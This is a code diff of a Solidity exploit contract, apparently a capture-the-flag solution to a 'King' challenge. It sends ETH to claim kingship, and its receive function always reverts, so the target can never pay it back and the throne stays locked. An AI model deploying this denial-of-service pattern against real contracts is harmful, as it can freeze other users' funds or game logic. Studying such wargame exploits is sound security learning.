@@ -3,22 +3,23 @@
 pragma solidity ^0.8.10;
 
 interface IKing {
-    function changeOwner(address _owner) external;
+    function attack() external;
 }
 
 contract KingHack {
-    IKing public challenge;
+    IKing king;
 
-    constructor(address challengeAddress) {
-        challenge = IKing(challengeAddress);
+    constructor(address kingContract) {
+        king = IKing(kingContract);
     }
 
     function attack() external payable {
-        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
-        require(success, "External call failed");
+        require(msg.value > 0);
+        (bool success, ) = payable(address(king)).call{value: msg.value}("");
+        require(success, "Attack failed");
     }
 
     receive() external payable {
-        require(false, "I am King forever!");
+        revert("You cannot transfer ETH here");
     }
 }
